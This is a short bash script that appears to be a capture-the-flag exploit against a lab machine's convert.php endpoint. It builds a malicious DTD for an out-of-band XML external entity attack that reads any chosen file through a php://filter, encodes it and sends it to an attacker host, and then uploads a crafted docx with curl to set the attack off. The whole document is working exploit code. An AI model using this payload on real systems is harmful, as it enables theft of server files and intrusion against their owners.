#!/bin/bash

HOST=10.10.10.173
URL="http://$HOST/convert.php"
FILE=$1

cat <<EOF > dtd.xml
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=$FILE">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.15.195/dtd.xml?%data;'>">
EOF

curl -s \
     -H "Expect: " \
     -F "userfile=@efil.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
     -F "submit=Generate pdf" \
     -o /dev/null \
     $URL

